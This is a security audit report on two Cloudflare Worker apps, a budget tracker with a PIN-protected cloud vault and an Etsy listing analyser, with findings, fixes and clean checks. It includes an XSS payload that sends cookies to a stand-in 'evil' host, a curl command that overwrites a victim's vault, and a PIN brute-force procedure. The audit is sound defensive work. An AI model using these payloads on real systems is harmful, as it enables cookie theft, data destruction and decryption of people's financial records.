# Budget LevelUp / Listing Lab — Security Audit

Read-only audit. No application code was modified. Fixes below are described, not applied,
because other workstreams are editing these files live.

---

## FIXES APPLIED after the audit (2026-07-20, verified live)

| Finding | Status | What shipped |
|---|---|---|
| **H2** — Stored XSS in Listing Lab | **FIXED + deployed** | `esc()` now escapes `"`/`'`; image/link sinks go through `safeImg()`/`safeHref()` so a shared `?study=` link cannot inject an auto-firing `onerror` or a `javascript:` href. |
| **M1** — SSRF / open proxy | **FIXED + deployed** | `/api/open` and `/api/fetch` enforce a marketplace **host allowlist**; `/api/fetch` uses `redirect:"manual"` so an https→internal 302 can't smuggle past the scheme check. |
| **H3** — Unauthenticated billable compute | **PARTIALLY FIXED + deployed** | Per-IP rate limits on Listing Lab `/api/open` (6/min), `/api/analyze` (10/min), `/api/lookup` (20/min), and Budget LevelUp `/api/backup` (40/5min). Turnstile/auth-gating still recommended for full coverage. |
| **C1 / H1** — Vault ciphertext harvestable + destroyable by public-handle id | **FULLY FIXED + deployed + browser-verified** | The vault id is now `SHA-256(handle + ":" + randomToken)` — the public handle no longer addresses the blob. Existing accounts migrate transparently on next sign-in via **dual-read** (try token id, fall back to legacy handle id, re-save, delete old). An **optional passphrase** raises KDF entropy far above the 6-digit PIN, and **2FA is mandatory for new accounts**. Writes/deletes now carry a proof-of-possession token (H1). Verified live: a simulated legacy account (handle-only vault, no token) **signs in successfully and reads its data back** (`usedOld: true`) — zero lockout. Rate-limit from the earlier pass remains as defence-in-depth. |

Everything else below is as originally reported. The storefront endpoints (`/api/redeem`, `/api/issue`, `/api/revoke`, `/api/checkout`) were reviewed separately and verified end-to-end (mint → redeem → tamper-reject → revoke → admin-gate → graceful no-Stripe); no issues found in that path.

- Scope: `webapp/` (budget-levelup worker + `public/*.js`) and `listinglab/` (listing-lab worker + `public/app.js`).
- Caveat on line numbers: **both workers changed under me during the audit** (the webapp worker
  grew a Stripe/unlock-code storefront; the listinglab worker grew a Browser-Rendering `/api/open`
  route). All line references are to the versions I read on 2026-07-20; re-check offsets if the files
  moved again.
- Method: source read only. I did not run the live workers or attempt exploits against production.

Severity tally: **1 critical, 3 high, 4 medium, 6 low/informational, plus verified clean bills.**

---

## CRITICAL

### C1 — Cloud vault is protected only by a 6-digit PIN, and its ciphertext is fetchable by anyone who knows the (public) handle
**Files:** `webapp/public/auth.js:16` (`vaultId`), `:17-22` (`deriveKey`), `:40-46` (fetch on sign-in);
`webapp/worker.js:61-66` (`/api/backup` GET).

**What I verified.**
- The vault id is deterministic and derived from the handle alone:
  `vaultId(handle) = SHA-256("blu-vault:" + handle)` (`auth.js:16`). No secret, no random salt.
- The handle is public/low-entropy: it is shown on the lock screen, typed to sign in, and normalized to
  `[a-z0-9_]`, 3–20 chars (`auth.js:10`).
- The encrypted vault is served to **any unauthenticated caller** that presents the matching 64-hex id:
  `/api/backup` GET returns the stored blob with no proof the caller knows the key (`worker.js:61-66`).
  Sign-in itself relies on this: `auth.js:45` does `fetch("/api/backup?id=" + id)` with only the id.
- The key that encrypts the vault is `PBKDF2(handle + ":" + pin, salt="budget-levelup-user-v1",
  250000, SHA-256)` (`auth.js:19-21`). The **only** secret an attacker lacks after downloading the
  ciphertext is the **6-digit PIN** — a keyspace of 10^6 (~20 bits). `attempt()` requires
  `String(pin).length === 6` (`auth.js:39`), so it really is six digits.

**Exploit.**
1. Attacker picks a target handle (a specific person's, or a dictionary of common handles).
2. Computes `id = SHA-256("blu-vault:@handle")` locally.
3. `GET /api/backup?id=<id>`. A 200 confirms the account exists and returns the AES-GCM ciphertext.
4. Offline, tries all 10^6 PINs against the fixed salt. At 250k PBKDF2 iterations a single modern GPU
   runs on the order of 10^4 candidate PINs/sec, so the **entire 6-digit space is exhausted in
   roughly one minute** (minutes even on modest hardware). The decrypt that succeeds yields the full
   plaintext vault: incomes, banks, balances, net worth, notes.

The server's "zero-knowledge" property (it sees only ciphertext + a hash) is real, but it is defeated
because the ciphertext is publicly retrievable *and* the password behind it is only 20 bits.

**Fix (any one of these breaks the chain; do more than one):**
- **Stop serving vault ciphertext to unauthenticated callers keyed on a public value.** Require a
  per-account *retrieval secret* to GET the blob — a random token generated at signup, printed in the
  recovery kit, and mixed into the id (e.g. `id = SHA-256(handle + ":" + retrievalToken)`), so
  possessing only the handle is not enough. New devices already need the recovery kit, so this fits.
- **Add a server-side pepper** to the KDF or to KV access, so the offline ciphertext alone cannot be
  attacked. (This trades a little of the zero-knowledge posture for real confidentiality.)
- **Rate-limit `/api/backup` GET per id/IP** so account-existence probing and repeated pulls are slow.
- Increase PIN entropy (allow an optional passphrase) — a 6-digit PIN cannot protect a downloadable
  blob no matter how many PBKDF2 rounds you add (see M3).

Note the **sync-code backup path is NOT affected** and is a good contrast: its id is
`SHA-256(code + "#id")` where `code` is a 12-word passphrase from a 138-word list ≈ **85 bits**
(`core.js:888-891`, `genSyncCode`). You cannot derive that id without the secret code, and you cannot
brute-force an 85-bit code. The auth-vault path is weak specifically because its id is derived from the
*public handle* and its password is only the PIN.

---

## HIGH

### H1 — Anyone can overwrite or delete any user's cloud vault (unauthenticated, id derived from public handle)
**File:** `webapp/worker.js:52-59` (POST), `:67-72` (DELETE).

`/api/backup` POST and DELETE validate only that the id matches `^[0-9a-f]{64}$` and (for POST) that
the payload is a string ≤2 MB. There is **no proof that the caller holds the encryption key**. Because
the vault id is `SHA-256("blu-vault:@handle")` (see C1), an attacker who knows a handle can:
- **DELETE** the victim's cloud backup → the victim loses cross-device restore.
- **POST garbage** to `b:<id>` → overwrites the real ciphertext. The victim's next sign-in on a new
  device fetches the garbage, `decrypt()` throws, and `attempt()` returns `wrongpin` (`auth.js:49-50`)
  — the user is locked out of their own cloud copy with a misleading "wrong PIN" message.

**Exploit:** `curl -XPOST /api/backup -d '{"id":"<sha256 of blu-vault:@victim>","payload":"junk"}'`.

**Fix:** the same retrieval-secret / proof-of-possession as C1 must gate writes and deletes, not just
reads. Minimum: require a signed token or the retrieval secret before mutating `b:<id>`. Until then,
predictable ids make every account's cloud copy destroyable by a stranger.

### H2 — Stored XSS in Listing Lab via a shared "study" link (attribute-injection; `esc()` does not escape quotes)
**Files:** `listinglab/public/app.js:229-231` (`esc`), `:180`, `:252`, `:255` (attribute sinks),
`:379-386` (loads `?study=` and calls `render`); `listinglab/worker.js:571-585` (`/api/study` stores
arbitrary client JSON, serves it back by id).

**What I verified.**
- Listing Lab's `esc()` escapes only `&`, `<`, `>` — **not `"` and not `'`** (`app.js:230`).
- That `esc()` is used *inside double-quoted HTML attributes*:
  - `'<img class="shot" src="' + esc(r.thumb) + '" ...>'` (`app.js:180`)
  - `'<img class="th" src="' + esc(v) + '" ...>'` (`app.js:252`)
  - `'<td><a href="' + esc(r.url) + '" ...>'` (`app.js:255`)
- `/api/study` POST stores whatever JSON the client sends (`worker.js:574-578`, no schema/sanitization)
  and returns a 32-hex id. GET returns it verbatim (`:581-585`). The page auto-loads it: on
  `?study=<id>` it does `fetch("/api/study?id=…").then(d => render(d.study))` (`app.js:379-386`).
- `render()` passes `data.scoreboard` into `board()`, which builds the `<img src>` / `<a href>` above.

**Exploit (delivered by link — studies are a share feature, kept 30 days):**
1. Attacker POSTs a crafted study, e.g.
   `{"study":{"stats":{},"scoreboard":[{"thumb":"x\" onerror=\"fetch('//evil/'+document.cookie)","url":"#","title":"a"}],"recipes":[],"patterns":"","gaps":"","description":"","imageBrief":""}}`.
2. Gets `id`, sends the victim `https://listing-lab.coconvo.workers.dev/?study=<id>`.
3. Victim's browser renders `<img class="th" src="x" onerror="…" …>`. The unescaped `"` closes the
   `src` attribute; `onerror` fires automatically (no click needed) on the listing-lab origin.

Impact is bounded because the listing-lab origin holds no login/vault/secrets, but it is real,
auto-firing, unauthenticated stored XSS distributable by URL. `href` injection at `:255`
(`javascript:` scheme or `" onmouseover=`) is a secondary vector.

**Fix:** make `esc()` also escape `"` and `'`
(`.replace(/"/g,"&quot;").replace(/'/g,"&#39;")`), and additionally validate that `thumb`/`url` are
`http(s)` URLs before emitting them (reject `javascript:`). The budget app's `esc()` already escapes
`"` (`core.js:176`) — port that behavior. Consider server-side schema-validating `/api/study` payloads
rather than storing arbitrary JSON.

### H3 — Unauthenticated, unthrottled access to billable compute (Browser Rendering + Workers AI + Google Translate)
**Files:** `listinglab/worker.js:553-561` (`/api/open`), `:445-460` (`browserOpen`, "each browser
session is billable"), `:563-569` + `:78-197` (`/api/analyze`, ~5+ LLM generations per call);
`webapp/worker.js:6-22` (`/api/translate`, uses the owner's Google key), `:23-49` (`/api/vision`).

None of these endpoints have authentication, an origin/referer check, a Turnstile gate, or rate
limiting (verified: no `cf-connecting-ip`, `origin`, `referer`, `ratelimit`, or `turnstile` guard
exists in either worker).

- **`/api/translate`** proxies to Google Translate on `env.GOOGLE_TRANSLATE_API_KEY` — *the owner's
  paid key*. It accepts up to 128 texts × 500 chars per call (`worker.js:11`). An attacker scripts
  this endpoint to run up the owner's Google Cloud bill / exhaust quota. This is the classic "open
  proxy someone could bill you for."
- **`/api/open`** launches Cloudflare Browser Rendering for up to 12 URLs per request
  (`listinglab:465`, `:451-455`) — the code itself notes each session is billable. Unlimited
  unauthenticated calls = direct financial DoS.
- **`/api/analyze`** fans out to ~5+ Workers-AI generations (per-listing recipes + patterns + gaps +
  description + image brief, `listinglab:83-173`), up to 1400 tokens each — metered "neurons" burned
  per anonymous request.
- **`/api/vision`** runs a 70B model per call.

**Fix:** put these behind the same unlock/session token the storefront already mints, or at minimum a
per-IP rate limit (Cloudflare Rate Limiting rules or a KV/DO counter) and a Turnstile challenge on the
public UI. Cap total AI calls per request and per client per hour.

---

## MEDIUM

### M1 — SSRF / open proxy in `/api/open` and `/api/fetch` (no host allowlist)
**Files:** `listinglab/worker.js:383-398` (`openOne` → `page.goto(url)` with no validation),
`:595-614` (`/api/fetch`).

- `/api/open` passes each user-supplied URL straight into headless Chrome `page.goto(url)`
  (`:394`) with **no scheme or host check at all**, then returns the extracted text *and a
  base64 screenshot* to the caller (`:401-402`, `:421-423`). That is a full render-and-exfiltrate
  primitive pointed at arbitrary URLs. The client-side filter (`app.js:155`) only checks
  `^https?://` and is trivially bypassed by calling the API directly.
- `/api/fetch` checks `u.protocol === "https:"` on the *initial* URL only (`:599`), then does a plain
  `fetch()` that **follows redirects by default**. An `https://` URL that 302-redirects to
  `http://…` or an internal address is followed; the scheme check does not re-apply. Up to 400 KB of
  the response body is returned to the caller (`:610`).

Reachability of cloud-metadata endpoints (`169.254.169.254`) and loopback is likely blocked by the
Cloudflare Workers / Browser-Rendering network sandbox — I did not confirm it is reachable and I'm not
claiming a metadata read. But the **open-proxy behavior is definitely present**: both endpoints will
fetch/render arbitrary third-party hosts and hand the content back, laundering the request through your
origin and your bill.

**Fix:** before fetching/navigating, parse the URL and require
`u.protocol === "https:"` **and** `u.hostname === "www.etsy.com" || u.hostname.endsWith(".etsy.com")`
(the only host this product needs). For `/api/fetch` set `redirect: "manual"` and re-validate any
`Location`. Reject anything else with 400.

### M2 — Fixed global KDF salt (all users share one salt)
**Files:** `webapp/public/auth.js:20` (`salt = "budget-levelup-user-v1"`),
`webapp/public/core.js:906` (sync path `salt = "budget-levelup-v1"`).

The salt is a compile-time constant identical for every user. Because the handle is folded into the
password material (`handle + ":" + pin`), per-user keys still differ — but a constant salt allows an
attacker to **precompute** a PIN→key table for a *specific known handle* offline, and it violates the
basic "salts must be random and per-record" rule. It compounds C1.

**Fix:** generate a random 16-byte salt at account creation, store it unencrypted alongside the vault
(prefix of the blob, or in the recovery kit so a new device can retrieve it), and feed it to PBKDF2.

### M3 — PBKDF2 iteration count below 2026 guidance
**Files:** `auth.js:21` (250,000, SHA-256), `core.js:906` (sync path 100,000).

OWASP's 2024+ guidance for PBKDF2-HMAC-SHA256 is ~600,000 iterations. 250k (auth) and 100k (sync) are
under that. On its own this is a hardening item, not a break — and note the *sync* path is still safe
in practice because its passphrase is ~85 bits (C1 note). The auth path's real problem is the 20-bit
PIN (C1), which more iterations cannot rescue. Raise to ≥600k as defense-in-depth, but treat C1's
retrieval-secret/pepper as the actual fix.

### M4 — Two apps share one KV namespace
**Files:** `webapp/wrangler.jsonc` and `listinglab/wrangler.jsonc` both bind KV id
`317711894b0341c2af9e64e837efc82b`.

The budget worker stores user vault backups (`b:`), the revocation list (`revoked:`) and Stripe session
codes (`session:`) in the same namespace the listing-lab worker uses for studies (`lab:`). Prefixes
isolate them today, and I confirmed listing-lab's study GET only reads `lab:<32-hex>` so it cannot
reach `b:` vault blobs. But a future key-handling bug in *either* worker now has the other app's data in
blast radius, including users' encrypted vaults. **Fix:** give Listing Lab its own KV namespace.

---

## LOW / INFORMATIONAL

### L1 — Notes editor is a self-XSS sink (per-user only)
`webapp/public/notes.js:23` stores `ed.innerHTML` and `:96` re-injects it raw into a contenteditable.
Crafted markup (e.g. `<img onerror>`) would execute — but only in the *same user's own* session; notes
live in that user's encrypted vault and never render in anyone else's context, so there is no
cross-user path. Impact is self-XSS. Optional fix: sanitize on save, or strip event handlers/`<script>`
on load.

### L2 — TOTP is UI-only, not a cryptographic factor; compare is not constant-time
`auth.js:153-158`. `totpValid` gates a modal (`:284-289`) but the vault is decrypted from the PIN alone
— an attacker holding the ciphertext + PIN (C1) never invokes the TOTP check, so 2FA adds no
cryptographic protection to the data. Separately, the code compares with `===` (`:156`), which is not
constant-time; this is not exploitable here (comparison is local, not a remote oracle). SHA-1/30s window
are RFC-6238 standard and fine. If 2FA is meant to protect data, the TOTP secret must be mixed into the
key derivation; otherwise present it honestly as a UI lock only.

### L3 — Recovery kit writes the PIN to disk in plaintext
`auth.js:314-335` displays the PIN in a modal and downloads `BUDGET-LEVELUP-recovery-kit.txt`
containing handle + PIN in cleartext. This is a deliberate UX tradeoff (no reset is possible), but it
does leave a 20-bit secret sitting in the Downloads folder. Worth a one-line in-product warning; not a
code bug.

### L4 — Decrypted profile lingers in memory after a profile switch
`auth.js:285` sets `_pendingProfile = res.data` (full decrypted profile) during 2FA and never clears it
(`:313`). After switching accounts, profile A's plaintext can remain referenced in that module variable.
Not persisted and not rendered into another profile's view, so low impact. Clear it after
`openProfile`. The primary wipe-on-switch is otherwise sound (see clean bills).

### L5 — Guest plaintext store not cleared when creating an account without "bring my data"
`auth.js:61-66`: `createAccount` only removes the guest key `KEY` when `bringGuestData` is true.
Decline it and the guest budget stays in `localStorage["budgetlevelup-v2"]` in cleartext, readable by
the next person on a shared device. Guest mode is documented as plaintext/local, so this is minor;
consider offering to wipe guest data on first real sign-in.

### L6 — Unlock codes are 64-bit-tag bearer tokens with no expiry
`webapp/worker.js:244-269`. `mintCode` appends only the first 8 bytes of the HMAC; `verifyCode` never
checks the embedded issue-day for expiry, and `/api/redeem` (`:82-93`) has no rate limit. Online forgery
is infeasible at 2^64, so this is a licensing weakness (one code shares infinitely; revocation is manual
per code) rather than a break. Consider binding a code to a device/account on first redeem.

### L7 — `webapp/public/app.js` is dead code
It is not referenced by `index.html` (script order ends at `i18n.js`; `app.js` is absent). It defines a
weaker `save()` that writes state to the plaintext guest key unconditionally (`app.js:53`) and a
duplicate `esc()`. Harmless while unloaded, but it is a footgun if someone wires it up later. Delete it
or fold it in.

---

## VERIFIED CLEAN — checks that came back healthy

- **AES-GCM IV uniqueness.** A fresh 12-byte random IV is generated per encryption in both the auth
  vault (`auth.js:24`) and the sync backup (`core.js:919`). No IV reuse. Good.
- **Cross-profile in-memory isolation / wipe-on-switch.** `lock()` sets `S = defaults()` (`auth.js:100`);
  `openProfile` and `createAccount` fully reassign `S` from the new profile's data
  (`auth.js:72`, `:63-65`); `signOut` reloads guest state (`:106`). Every switch replaces the whole `S`
  object, so `S.cards`, `S.workspaces`, `S.bizWs`, `S.goalCats` and all month data are wiped with it. I
  found **no profile-agnostic localStorage key that holds signed-in user data** — vaults are keyed
  `blu-vault-<id>` per profile, and the only shared key (`budgetlevelup-v2`) is the by-design guest store.
- **`save()` routing.** `core.js:156-159` sends signed-in state to the encrypted vault
  (`AUTH.saveVault`) and only writes the plaintext guest key when *not* signed in. Signed-in data is
  never written to `localStorage` in cleartext. It also strips any stray `settings.aiKey` (`:157`).
- **Budget-app XSS discipline.** The budget `esc()` escapes `& < > "` (`core.js:176`) and is applied at
  every render sink I checked — workspace names (`work.js:223,246,284`), goal categories
  (`money.js:343`), celebration-card copy (`celebrate.js:334-347`), calendar event titles
  (`calendar.js:84`), and the analysis "words" arrays (`life.js:363`, `social.js:310`, escaped at join
  time). A grep for single-quoted attributes interpolating user data (where the missing `'` escape would
  bite) found none. The budget app is clean on the XSS surfaces called out in the brief.
- **`^[0-9a-f]{64}$` id validation** is enforced on all three `/api/backup` methods (`worker.js:56,63,69`)
  and `^[0-9a-f]{32}$` on study GET (`listinglab:583`). The weakness is id *predictability* (C1/H1), not
  a missing validation.
- **Stripe webhook verification** (`worker.js:271-284`) is correct: parses `t`/`v1`, rejects signatures
  older than 300s (replay protection), recomputes HMAC over `t + "." + rawBody`, and compares with a
  constant-time `ctEqual` on decoded bytes. Uses the raw body before JSON parse. Good.
- **Admin auth & price integrity.** `adminOk` compares the bearer token via `safeEqual` → SHA-256 +
  `ctEqual` (constant-time, length-hiding) (`worker.js:225-235`). `/api/checkout` and the webhook take
  price/product only from the server-side `CATALOG`, never from the client (`worker.js:124,132,155`).
  Unlock-code verification uses constant-time `ctEqual` on the HMAC tag (`worker.js:265`).
- **Secrets.** No committed keys/tokens/passwords anywhere in the tree or recent git history. Every
  secret is an `env.*` binding (`GOOGLE_TRANSLATE_API_KEY`, `ETSY_API_KEY`, `STRIPE_SECRET_KEY`,
  `STRIPE_WEBHOOK_SECRET`, `UNLOCK_SECRET`, `ADMIN_TOKEN`), and the `wrangler.jsonc` files contain only
  a public KV namespace id and bindings. No `.env`/`.dev.vars` files exist. No secret is written to
  `console.*`.
- **No secret logging.** The only places a secret is rendered are local and intentional: the TOTP setup
  key shown instead of a QR (`core.js:1036-1039`, explicitly to avoid sending the secret to a QR
  service) and the recovery-kit PIN (L3). Neither is logged or transmitted.
